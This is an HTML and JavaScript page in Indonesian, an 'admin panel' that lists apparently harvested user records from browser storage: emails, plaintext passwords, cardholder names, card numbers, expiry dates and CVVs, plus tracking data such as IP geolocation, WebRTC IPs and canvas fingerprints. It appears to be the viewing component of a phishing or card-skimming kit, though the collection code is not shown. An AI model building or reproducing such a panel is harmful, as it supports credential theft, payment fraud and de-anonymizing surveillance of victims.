<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 p-8">
    <div class="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-lg">
        <h1 class="text-2xl font-bold mb-4">Admin Panel - Data Pengguna</h1>
        <button id="clearData" class="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600 mb-4">Hapus Data</button>
        <div id="userData" class="space-y-4"></div>
    </div>

    <script>
        function displayUserData() {
            const userDataDiv = document.getElementById('userData');
            const storedData = JSON.parse(localStorage.getItem('trackedUsers') || '[]');

            if (storedData.length === 0) {
                userDataDiv.innerHTML = '<p class="text-gray-500">Belum ada data pengguna.</p>';
                return;
            }

            userDataDiv.innerHTML = storedData.map((data, index) => `
                <div class="border p-4 rounded">
                    <p><strong>Pengguna #${index + 1}</strong></p>
                    <p><strong>Email:</strong> ${data.email || 'Tidak tersedia'}</p>
                    <p><strong>Kata Sandi:</strong> ${data.password || 'Tidak tersedia'}</p>
                    <p><strong>Detail Pembayaran:</strong></p>
                    <ul class="ml-4 list-disc">
                        <li><strong>Nama Pemilik Kartu:</strong> ${data.payment?.cardHolder || 'Tidak tersedia'}</li>
                        <li><strong>Nomor Kartu:</strong> ${data.payment?.cardNumber || 'Tidak tersedia'}</li>
                        <li><strong>Tanggal Kedaluwarsa:</strong> ${data.payment?.expiryDate || 'Tidak tersedia'}</li>
                        <li><strong>CVV:</strong> ${data.payment?.cvv || 'Tidak tersedia'}</li>
                    </ul>
                    <p><strong>Data Pelacakan:</strong></p>
                    <ul class="ml-4 list-disc">
                        <li><strong>IP Address:</strong> ${data.tracking?.ip || 'Tidak tersedia'}</li>
                        <li><strong>Kota:</strong> ${data.tracking?.city || 'Tidak tersedia'}</li>
                        <li><strong>Negara:</strong> ${data.tracking?.country || 'Tidak tersedia'}</li>
                        <li><strong>Lokasi (IP):</strong> Lat: ${data.tracking?.ipLatitude || 'Tidak tersedia'}, Lon: ${data.tracking?.ipLongitude || 'Tidak tersedia'}</li>
                        <li><strong>Zona Waktu:</strong> ${data.tracking?.timezone || 'Tidak tersedia'}</li>
                        <li><strong>Bahasa:</strong> ${data.tracking?.language || 'Tidak tersedia'}</li>
                        <li><strong>User Agent:</strong> ${data.tracking?.userAgent || 'Tidak tersedia'}</li>
                        <li><strong>Platform:</strong> ${data.tracking?.platform || 'Tidak tersedia'}</li>
                        <li><strong>WebRTC IPs:</strong> ${data.tracking?.webrtcIps?.join(', ') || 'Tidak tersedia'}</li>
                        <li><strong>Canvas Fingerprint:</strong> ${data.tracking?.canvasFingerprint || 'Tidak tersedia'}</li>
                    </ul>
                    <p><strong>Waktu:</strong> ${data.tracking?.timestamp || 'Tidak tersedia'}</p>
                </div>
            `).join('');
        }

        document.getElementById('clearData').addEventListener('click', () => {
            localStorage.removeItem('trackedUsers');
            displayUserData();
        });

        displayUserData();
    </script>
</body>
</html>
